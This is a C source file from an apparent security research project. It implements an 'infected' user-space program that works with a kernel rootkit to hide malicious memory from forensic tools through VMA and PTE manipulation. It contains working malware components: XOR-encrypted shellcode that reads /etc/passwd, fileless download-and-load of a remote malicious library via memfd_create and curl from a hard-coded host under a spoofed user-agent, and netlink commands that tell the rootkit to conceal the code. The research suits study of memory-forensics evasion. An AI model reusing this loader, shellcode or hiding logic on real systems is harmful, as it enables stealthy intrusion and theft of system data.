/* norm-proc.c -- infected user space program to demonstrate VMA/PTE hiding
 *
 * Copyright (C) 2019 Patrick Reichenberger
 * Additional Authors:
 * Frank Block, ERNW Research GmbH <fblock@ernw.de>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#include <sys/mman.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#include <signal.h>
#include <curl/curl.h>
#include <pthread.h>

#include "norm-proc.h"

#define NETLINK_USER 31
#define MAX_PAYLOAD 1024

/* Default is the automatic mode. If MANUAL_MODE is defined, the operating mode is the manual mode.
 * This MUST match with the rootkit's operating mode.
 * For automatic mode, comment out the line. */
#define MANUAL_MODE

/* Define the address to download malicious library and benign library */
#define MAL_URL "http://192.168.56.1:4443/xor-mallib.so"
#define BEN_URL "http://192.168.56.1:4443/xor-benignlib.so"


// read passwd shellcode - http://shell-storm.org/shellcode/files/shellcode-878.php
// modifications:  xor encrypted with t0pSecr3t!  ; removed null byte self xor, so page can be rx ; added token: AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA
// original: \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
char encrypted_shellcode[] = "\x9f\x0f\x2f\xc3\xf5\xf3\xe2\x7b\x45\xe1\x70\x32\x38\x62\x93\x6c\x77\x55\xf5\xcd\x8b\x3f\x38\xde\x51\x47\x3a\xba\xb3\x69\x45\xe2\x16\xe9\x9a\x6c\x3a\x02\xb4\x2e\x71\x78\x41\xac\x25\xe3\xb5\x32\x3c\xa8\xb6\x78\x41\x93\x61\x62\x7d\x36\x3c\x10\xb4\x34\x4c\x5c\x60\x8b\xce\xcc\x8b\xde\x5b\x55\x04\x30\x4a\x13\x13\x40\x07\x56\x10\x30\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x2b\x47\x18\x32\x11\x4d\x06\x5b\x11\x0f\x11\x49\x15\x20\x4b\x10\x17\x56\x5a\x40\x1a\x54\x5e\x27\x0d\x06\x5c\x56\x15\x53\x07\x1e\x18\x36\x04\x11\x5c\x1d\x00\x49\x11\x1e\x1d\x3a\x0b\x07\x5c\x51\x11\x4d\x1d\x55\x06\x36\x16\x3c\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x65";
int encrypted_shellcode_size = sizeof(encrypted_shellcode)-1;
void* (*shellcode_func)(void *);
char key[] = "t0pSecr3t!";
int keysize = sizeof(key) - 1;
int token_offset = sizeof(encrypted_shellcode) - 93;

enum {
    NO_TECHNIQUE,
    PTE_REMAPPING_TECHNIQUE,
    PTE_ERASURE_TECHNIQUE,
    MAS_REMAPPING_TECHNIQUE
};

int file_size;
short subversion_technique = NO_TECHNIQUE;
short subversion_set_up = 0;
short hiding_enabled = 0;
#ifdef MANUAL_MODE
char hiding_cmd[128];
char reveal_cmd[128];
#endif
/* Global file descriptors and define name of malicious/benign library */
int malfd;
char *mallib_name = "mal_dynlib";
int benfd;
char *benlib_name = "ben_dynlib";

enum {
    PRIVATE_MEMORY,
    SHARED_MEMORY
};


/* Wrapper for the memfd_create system call */
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

/* Decryption function that contains the one bye XOR key */
void xor(char *plain, size_t size) {
    int key = 0x1a;
    for (int i = 0; i < size; ++i) {
        if (plain[i] != 0x00 && plain[i] != key) {
            plain[i] ^= key;
        }
    }
}

/** write_data - callback for curl write
 *  @ptr: pointer to data
 *  @size: size of element
 *  @nmemb: number of elements (size per element is @size)
 *  @mem_fd: memory file descriptor
 */
size_t write_data (void *ptr, size_t size, size_t nmemb, int mem_fd) {
    /* Decrypt the data */
    xor(ptr, nmemb);
    if (write(mem_fd, ptr, nmemb) < 0) {
        close(mem_fd);
        exit(-1);
    }
    // remove traces from temporary memory, allocated by curl
    memset(ptr, 0, nmemb);
}

// Download our share object from a C&C via HTTPs (https://x-c3ll.github.io/posts/fileless-memfd_create/)
/** download_to_RAM - download library file and store in memory file
 *  @download: download URL of file
 *  @libname: name of memory file
 *
 *  Download the file from the specified URL and create a memory file where to store the content in.
 *  Could be done via HTTPS, but for testing HTTP is enough.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
int download_to_RAM(char *url, char* libname) {
    CURL *curl;
    CURLcode res;

    /* Create memory file with name specified in parameter libname */
    int mem_fd = memfd_create(libname, MFD_CLOEXEC);
    if (mem_fd < 0) {
        fprintf(stderr, "Failed to open file descriptor\n");
        exit(-1);
    }

    /* Download the file and write it to memory file */
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Can be used for HTTPS
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // Can be used for HTTPS
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); // Callback
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, mem_fd); // Arguments for callback

        res = curl_easy_perform(curl);
        if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
            close(mem_fd);
            exit(-1);
        }
        curl_easy_cleanup(curl);
        return mem_fd;
    }
}

/** load_lib - load the library from file descriptor
 *  @fd: file descriptor
 *
 *  Dynamically load the file specified in the file descriptor.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
void *load_lib(int fd) {
    /* Write the path of the file descriptor in the path variable
     * This is needed to call dlopen, which opens the file in memory as a dynamic library.
     */
    char path[128];
    snprintf(path, 128, "/proc/%d/fd/%d", getpid(), fd);

    /* Load library and resolve all symbols */
    void *handle = dlopen(path, RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "Error in dlopen: %s\n", dlerror());
    }
    return handle;
}

/** install_lib - wrapper for installing library
 *  @url: url to download library from
 *  @libname: name of memory file
 *
 */
void *install_lib(char* url, char* libname) {
    void *handle;

    if(!malfd) {
        malfd = download_to_RAM(url, libname);
        handle = load_lib(malfd);
    } else {
        benfd = download_to_RAM(url, libname);
        handle = load_lib(benfd);
    }
    return handle;
}

/** send_message_to_kernel - send netlink message to kernel
 *
 *  @param msg_content
 *
 *  This function is based on the code of: Adnan Waheed
 *  https://stackoverflow.com/a/3334782
 */
int send_message_to_kernel(void *msg_content) {
    struct nlmsghdr *nlh = NULL;
    struct sockaddr_nl src_addr, dest_addr;
    int nl_sockfd;
    struct msghdr msgh;
    struct iovec iov;

    if (strlen(msg_content) > 1024) {
        fprintf(stderr, "Message size too big (> 1024)");
        return 0;
    }
    /* Create netlink socket with user-mode socket protocol family */
    nl_sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_USER);
    if(nl_sockfd < 0) {
        fprintf(stderr, "Failed to create netlink socket\n");
        return 0;
    }

    /* Set the entries in src_addr to 0 */
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();

    /* Bind the socket to the source address */
    bind(nl_sockfd, (struct sockaddr *) &src_addr, sizeof(src_addr));

    /* Set the entries in dest_addr to 0 */
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0; // 0 means kernel
    dest_addr.nl_groups = 0; // Only unicast messages, no multicast

    /* Build the netlink header */
    nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(MAX_PAYLOAD));
    /* Set the entries in the header to 0 */
    memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh->nlmsg_len = NLMSG_LENGTH(MAX_PAYLOAD);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;

    /* Add the payload */
    strcpy(NLMSG_DATA(nlh), msg_content);

    /* For datagram sockets, sendmsg() needs to be used, which takes a msghdr as parameter.
     * msghdr needs iov. These is a pointer to an array of iovec structures which consist of
     * a base address and a length and allows to transfer scattered data.
     * So first, set up one iovec structure pointing to the netlink message. */
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;
    /* Set up the msghdr by specifying the destination address and the iovec structures (content) */
    memset(&msgh, 0, sizeof(struct msghdr));
    msgh.msg_name = (void *) &dest_addr;
    msgh.msg_namelen = sizeof(dest_addr);
    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;

    printf("Sending a message to the kernel...\n");
    /* Send the message to the kernel */
    if(sendmsg(nl_sockfd, &msgh, 0), NLMSG_DATA(nlh) < 0) {
        printf("Error in sending message: %s", strerror(errno));
    } else {
        printf("Successfully sent.\n");
    }

    /* Optional, receive message from kernel, can be used as acknowledgement */
    //memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    //recvmsg(nl_sockfd, &msgh, 0);
    //printf("Received message from kernel: %s\n", NLMSG_DATA(nlh));

    close(nl_sockfd);
    free(nlh);
	return 1;
    //return NLMSG_DATA(nlh);
}

/** build_cmd - builds command which is sent to the rootkit
 *  @technique: specify technique to used
 *  @mallib_path: name of malicious library (memfd name) to hide
 *  @benlib_path: name of benign library (memfd name) if necessary, otherwise 0
 * 
 *  Create the command the rootkit is able to parse. Return a pointer to the allocated string region.
 */
char *build_cmd(char *technique, char *mallib_path, char *benlib_path) {
    int size;
    char *cmd;
    if(benlib_path) {
        size = strlen(technique) + strlen(mallib_path) + strlen(benlib_path) + 8;
        cmd = (char *) malloc(size * sizeof(char));

        snprintf(cmd, size, "%s \"%s\" \"%s\"", technique, mallib_path, benlib_path);
    } else {
        size = strlen(technique) + strlen(mallib_path) + 5;
        cmd = (char *) malloc(size * sizeof(char));
        snprintf(cmd, size, "%s \"%s\"", technique, mallib_path);
    }
    return cmd;
}


/** pte_invalidate_restore - manages pte invalidate/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by invalidating its PTEs is sent to the rootkit.
 */
void *pte_invalidate_restore() {
    void *mal_handle;
    int response_stat;
    
    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);
    /* Send the signal to the rootkit to hide the pages of the malicious library */
    char *cmd = build_cmd("pteinvalidate", mallib_name, NULL);
    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif
    
    /* Sends the hiding command to the rootkit */
    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it 
     * each time when the data is to be restored. */
    cmd = build_cmd("pterestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}


void *prepare_anon_memory(int memsize, int memory_type){
    char* mem_addr = NULL;

    // For MAS remapping, we require at least two pages 
    if (subversion_technique == MAS_REMAPPING_TECHNIQUE && memsize <= 0x1000)
        return NULL;

    if (memory_type == SHARED_MEMORY){
        mem_addr = mmap(NULL, memsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        printf("shared memory is here: %p\n", mem_addr);

    }
    else{
        mem_addr = mmap(NULL, memsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        printf("private memory is here: %p\n", mem_addr);
    }

    if (!mem_addr){
        printf("Memory creation failed. Aborting ... \n");
        return mem_addr;
    }

    int i = 0;
    // With MAS remapping, we leave benign data in the first page
    if (subversion_technique == MAS_REMAPPING_TECHNIQUE){
        i = 0x1000;
        memset(mem_addr, 0x41, 0x1000);
    }

    char* temp_pointer = NULL;
    for (; i < memsize; i=i + 0x1000){
        temp_pointer = (char*)(mem_addr + i);
        memcpy(temp_pointer, encrypted_shellcode, encrypted_shellcode_size);

        for (int j=0; j<encrypted_shellcode_size; j++)
            ((char*)temp_pointer)[j] = ((char*)temp_pointer)[j] ^ key[j%keysize];
    }

    mlock(mem_addr, memsize);

    return mem_addr;
}


/** pte_erasure_restore_anon - manages pte invalidate/restore technique for anonymous memory
 * 
 *  First the malicious memory is loaded, i.e. downloaded and loaded.
 *  Then, the command to hide the malicious memory by invalidating its PTEs is sent to the rootkit.
 */

void *pte_erasure_restore_anon(int memory_type) {
    int response_stat;
    char *mem_addr;
    int memsize = 0x3000;

    mem_addr = prepare_anon_memory(memsize, memory_type);
    if (!mem_addr){
        printf("Memory creation failed. Aborting ... \n");
        return mem_addr;
    }

    char vm_start[32];
    snprintf(vm_start, 32, "%p", mem_addr);
    /* Send the signal to the rootkit to hide the pages of the malicious library */
    char *cmd = build_cmd("pteinvalidateanon", vm_start, NULL);
    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif
    

    /* Sends hiding command to the rootkit */
    response_stat = send_message_to_kernel(cmd);

    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it 
     * each time when the data is to be restored. */
    cmd = build_cmd("pterestoreanon", vm_start, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mem_addr;
}




/** pte_remap_reset - manages pte remap/reset technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by remapping its PTEs is sent to the rootkit.
 */
void *pte_remap_reset() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to remap the pages the malicious library to page frames of the init process */
    char *cmd = build_cmd("pteremap", mallib_name, NULL);
    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("ptereset", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}


void *pte_remap_reset_anon(int memory_type) {
    int response_stat;

    char *mem_addr;
    int memsize = 0x3000;

    mem_addr = prepare_anon_memory(memsize, memory_type);
    if (!mem_addr){
        printf("Memory creation failed. Aborting ... \n");
        return mem_addr;
    }

    char vm_start[32];
    snprintf(vm_start, 32, "%p", mem_addr);

    /* Sends hiding command to the rootkit */
    char *cmd = NULL;
    if (memory_type == SHARED_MEMORY)
        cmd = build_cmd("pteremapanon_s", vm_start, NULL);
    else
        cmd = build_cmd("pteremapanon_p", vm_start, NULL);

    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    if (memory_type == SHARED_MEMORY)
        cmd = build_cmd("pteresetanon_s", vm_start, NULL);
    else
        cmd = build_cmd("pteresetanon_p", vm_start, NULL);

    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mem_addr;
}



void *mas_remap_reset() {
    int response_stat;

    char *mem_addr;
    int memsize = 0x3000;

    mem_addr = prepare_anon_memory(memsize, 0);
    if (!mem_addr){
        printf("Memory creation failed. Aborting ... \n");
        return mem_addr;
    }

    char vm_start[32];
    snprintf(vm_start, 32, "%p", mem_addr);

    /* Sends hiding command to the rootkit */
    char *cmd = NULL;
    cmd = build_cmd("masremapping", vm_start, NULL);

    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("masremapping_reset", vm_start, NULL);

    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mem_addr;
}



/** vma_delete - manages vma delete/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *vma_delete() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to delete the VMAs of the malicious library */
    char *cmd = build_cmd("vmadelete", mallib_name, NULL);
    #ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("vmarestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** vma_delete - manages vma delete/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *vma_modify() {
    void *mal_handle;
    void *benign_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    /* Get the benign_handle to the loaded library (the benign code) */
    benign_handle = install_lib(BEN_URL, benlib_name);
    if(malfd)
        close(malfd);
    if(benfd)
        close(benfd);

    /* Send the signal to the rootkit to modify the limits of the VMAs of the malicious library to the
     * limits of the VMAs of the benign library specified. */
    char *cmd = build_cmd("vmaremapping", mallib_name, benlib_name);
    #ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("vmareset", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** pte_vma_delete - manages vma delete/restore technique
 *
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *pte_vma_delete() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to delete the VMAs of the malicious library */
    char *cmd = build_cmd("ptevmadelete", mallib_name, NULL);
#ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
#endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

#ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("ptevmarestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
#endif

    return mal_handle;
}


#ifdef MANUAL_MODE
/** reveal_data - sends command to rootkit to reveal data in manual mode
 *
 *  This function is called when the manual mode is active and a malicious action should be executed.
 *  Before running the malicous actions, the data needs to be revealed, which is done with this function.
 *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
 */
int reveal_data(void) {
    if(subversion_set_up && hiding_enabled) {
        fprintf(stderr, "Revealing hidden data\n");
        int response_stat = send_message_to_kernel(reveal_cmd);
        if(!response_stat) {
            fprintf(stderr, "Aborting, error in sending message to kernel\n");
            return -1;
        }
        hiding_enabled = 0;
        return 0;
    }
}

/** hide_data - sends command to hide data in manual mode
 *
 *  This function is called when the manual mode is active and a malicious action should be hidden again.
 *  After running the malicous actions, the data needs to be hidden again, which is done with this function.
 *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
 */
int hide_data(void) {
    if(subversion_set_up && !hiding_enabled) {
        fprintf(stderr, "Hiding malicious data\n");
        int response_stat = send_message_to_kernel(hiding_cmd);
        if(!response_stat) {
            fprintf(stderr, "Aborting, error in sending message to kernel\n");
            return -1;
        }
        hiding_enabled = 1;
        return 0;
    }
}

void signal_handler(int signal){
    printf("\nCaught signal %d, exiting...\n", signal);
    reveal_data();
    exit(1);
}
#endif


void execute_shellcode(void *mal_handle){
    if(mal_handle) {
#ifdef MANUAL_MODE
        if (subversion_technique == MAS_REMAPPING_TECHNIQUE)
            printf("We are doing MAS remapping, so we don't need to unhide the malicious memory in order to execute it.\n");
        else
            reveal_data();
#endif
        pthread_t t1;
        void *s;
        int offset = 0;
        if (subversion_technique == MAS_REMAPPING_TECHNIQUE)
            offset = 0x1000;

        shellcode_func = (void* (*)(void *)) mal_handle + offset;
        printf("Executing read passwd shellcode at %p...\n\n", shellcode_func);
        pthread_create(&t1, NULL, shellcode_func, NULL);
        pthread_join(t1, &s);
        printf("\n\n");
#ifdef MANUAL_MODE
        if (subversion_technique != MAS_REMAPPING_TECHNIQUE)
            hide_data();
#endif
    }
}

int main() {
    void *mal_handle;
    char string[100];

    struct sigaction signalHandler;
    signalHandler.sa_handler = signal_handler;
    sigemptyset(&signalHandler.sa_mask);
    signalHandler.sa_flags = 0;
    sigaction(SIGINT, &signalHandler, NULL);
    sigaction(SIGQUIT, &signalHandler, NULL);
    sigaction(SIGSEGV, &signalHandler, NULL);

    while(1) {
        printf("Enter some string (<100 chars, a-z, A-Z): ");
        scanf("%s", string);
        int e;

        if(strlen(string) >= 100) {
            return -1;
        }
        if(!subversion_set_up) {
            if (strcmp(string, "load_pteremapping") == 0) {
                /* PTE remapping with anonymous memory */
                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                if(!(mal_handle = pte_remap_reset_anon(0))) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (strcmp(string, "load_pteerasure") == 0) {
                /* PTE erasure with anonymous memory */
                subversion_technique = PTE_ERASURE_TECHNIQUE;
                if(!(mal_handle = pte_erasure_restore_anon(0))) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (strcmp(string, "load_masremapping") == 0) {
                /* MAS remapping with anonymous memory */
                subversion_technique = MAS_REMAPPING_TECHNIQUE;
                if(!(mal_handle = mas_remap_reset())) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
#ifdef DELETE_PAGE_CACHE
            } else if(!strcmp(string, "load_pteinvalidate_lib")) {
                /* Invalidate/restore PTEs */
                subversion_technique = PTE_ERASURE_TECHNIQUE;
                if(!(mal_handle = pte_invalidate_restore())) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_pteremap_lib")) {
                /* Remap/reset PTEs */
                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                if(!(mal_handle = pte_remap_reset())) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_pteremap_s")) {
                /* PTE remapping with shared memory */
                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                if(!(mal_handle = pte_remap_reset_anon(1))) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_pteerasure_s")) {
                /* PTE erasure with shared memory */
                subversion_technique = PTE_ERASURE_TECHNIQUE;
                if(!(mal_handle = pte_erasure_restore_anon(1))) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_masremapping_lib")) {
                /* Modify/reset VMAs */
                subversion_technique = PTE_REMAPPING_TECHNIQUE;
                if(!(mal_handle = vma_modify())) {
                    return -1;
                }
                subversion_set_up = 1;
                hiding_enabled = 1;
#endif
            }
        }
        // Hiding already set up
	    else {
            if (strcmp(string, "reveal_data") == 0) {
                /* Unhide hidden data */
                reveal_data();
            } else if (strcmp(string, "hide_data") == 0) {
                /* Rehide data */
                hide_data();
#ifdef DELETE_PAGE_CACHE
            /* These to keywords should represent triggering malicious actions on certain events. In this case
            * the events are keywords */
            } else if (!strcmp(string, "run_malprint1")) {
                if(mal_handle) {
                    #ifdef MANUAL_MODE
                    reveal_data();
                    #endif
                    void (*malicious_print)(void);
                    /* Obtain the address of the function from the malicious library */
                    *(void **)(&malicious_print) = dlsym(mal_handle, "malicious_print");
                    (*malicious_print)();
                    #ifdef MANUAL_MODE
                    hide_data();
                    #endif
                }
            } else if (!strcmp(string, "run_malprint2")) {
                /* Obtain the address of the second function from the malicious library */
                if(mal_handle) {
                    #ifdef MANUAL_MODE
                    reveal_data();
                    #endif
                    void (*malicious_print2)(void);
                    *(void **) (&malicious_print2) = dlsym(mal_handle, "malicious_print2");
                    (*malicious_print2)();
                    #ifdef MANUAL_MODE
                    hide_data();
                    #endif
                }
#endif
            } else if (strcmp(string, "run_shellcode") == 0) {
                execute_shellcode(mal_handle);
            }
        } 
        if (strcmp(string, "exit") == 0) {
            reveal_data();
            return 0;
        }

        /* Do ROT13 for input */
        for(int i = 0; i < strlen(string); ++i) {
            int c = (int) string[i];
            if(c >= 'A' && c <= 'Z') {
                if((e = c + 13) <= 'Z') {
                    string[i] = (char) e;
                } else {
                    string[i] = (char) c - 13;
                }
            } else if(c >= 'a' && c <= 'z') {
                if((e = c + 13) <= 'z') {
                    string[i] = (char) e;
                } else {
                    string[i] = (char) c - 13;
                }
            }
        }
        printf( "\nThat is in ROT13: ");
        puts( string );

    }
}
